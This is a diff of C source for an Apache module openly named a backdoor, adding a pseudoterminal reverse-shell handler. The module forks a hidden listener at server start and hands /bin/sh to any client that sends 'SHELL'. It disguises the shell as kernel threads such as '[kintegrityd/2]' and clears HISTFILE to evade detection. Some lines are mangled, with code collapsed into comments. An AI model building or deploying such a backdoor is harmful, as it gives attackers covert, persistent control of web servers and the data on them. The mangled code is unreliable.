@@ -1,6 +1,7 @@
 //Socks5 code from https://github.com/fgssfgss/socks_proxy
+/* Code inspired from @TheXC3LL */
 
-/* backdoor PoC (@TheXC3LL) */
+/* Backdoor module (@RicoVlad) */
 
 #include <sys/types.h>
 #include <stdio.h>
@@ -20,7 +21,9 @@
 #include <sys/stat.h>
 #include <dirent.h>
 #include <sys/un.h>
+// forkpty() --> https://linux.die.net/man/3/forkpty
 #include <pty.h>
+#include <utmp.h>
 
 #include "httpd.h"
 #include "http_config.h"
@@ -232,11 +235,10 @@ void shell(int socket) {
 	pipe(output);
 
 	spid = fork();
-	//spid = forkpty(&socket,NULL,NULL,NULL);
     if (spid < 0) {
-        fprintf(stderr, "[-] Error: could not forkpty");
+        fprintf(stderr, "[-] Error: could not fork");
         exit(EXIT_FAILURE);
-    }else if (spid == 0) {
+    }else{
 		char *argv[] = { "[kintegrityd/2]", 0 };
         char *envp[] = { "HISTFILE=", 0 };
 		close(input[1]);
@@ -245,10 +247,68 @@ void shell(int socket) {
 		dup2(socket, 0);
 		dup2(socket, 1);
 		dup2(socket, 2);
-		//execve("/bin/sh", argv, envp);
-        execlp("/bin/sh", "[kworker:01]", NULL);
+		execve("/bin/sh", argv, envp);
 	} 
 	return;
+}
+
+void shellPTY(int socket) {
+
+    struct termios terminal;
+    int terminalfd, n = 0;
+    pid_t pid;
+    char input[1024];
+    char output[1024];
+
+    // Creamos un nuevo proceso hijo que operará en un pseudoterminal
+    pid = forkpty(&terminalfd, NULL, NULL, NULL);
+
+    if (pid < 0) {
+        fprintf(stderr, "[-] Error: could not forkpty");
+        exit(EXIT_FAILURE);
+    }
+    else if (pid == 0) { // Estamos en el proceso hijo que tiene el PTY
+        //int input[2];
+        //int output[2];
+        int n, sr;
+        char buf[1024];
+        fd_set readset;
+        struct timeval tv;
+        pid_t spid;
+
+        pipe(input);
+        pipe(output);
+
+        char *argv[] = { "[kintegrityd/2]", 0 };
+        char *envp[] = { "HISTFILE=", 0 };
+        close(input[1]);
+        close(output[0]);
+
+        dup2(socket, 0);
+        dup2(socket, 1);
+        dup2(socket, 2);
+        execve("/bin/sh", argv, envp);
+    }
+    else { // Proceso padre
+        // Atributos: sin ECHO
+        tcgetattr(terminalfd, &terminal);
+        terminal.c_lflag &= ~ECHO;
+        tcsetattr(terminalfd, TCSANOW, &terminal);
+
+        // Utilizaremos select para comprobar si hay datos y enviarlos en un sentido u otro
+        fd_set readfd;
+        for(;;) {
+            FD_ZERO(&readfd);
+            FD_SET(terminalfd, &readfd); // Si terminalfd tiene datos
+            FD_SET(1, &readfd); // Si el socket tiene datos
+            select(terminalfd + 1, &readfd, NULL, NULL, NULL);
+            if (FD_ISSET(terminalfd, &readfd)) { // Hay datos desde el proceso hijo
+                n = read(terminalfd, &output, 1024);
+                if (n <= 0) { write(2, "[+] Shell is dead. Closing connection!nn", strlen("[+] Shell is dead. Closing connection!nn")); break; } write(2, output, n); // Los mandamos por el socket memset(&output, 0, 1024); } if (FD_ISSET(1, &readfd)) { // Hay datos en el socket memset(&input, 0, 1024); n = read(1, &input, 1024); if (n > 0) {
+                write(terminalfd, input, n); // Los escribimos en el STDIN del proceso hijo
+            }
+        }
+    }
 }
 
 
@@ -354,11 +414,11 @@ static int backdoor_post_read_request(request_rec *r) {
 }
 
 backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
-	pid = fork();
+    pid = fork();
 
-	if (pid) {
-		return OK;
-	}
+    if (pid) {
+        return OK;
+    }
 
 	int master, i, rc, max_clients = 30, clients[30], new_client, max_sd, sd;
 	struct sockaddr_un serveraddr;
@@ -417,12 +477,14 @@ backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, ser
 				}
 				else  {
 					if (strstr(buf, "SHELL")){
-						shell(sd);
+						shellPTY(sd);
 					}
 				}
 			}
 		}
 	}
+
+
 }
 
 static int backdoor_log_transaction(request_rec *r) {
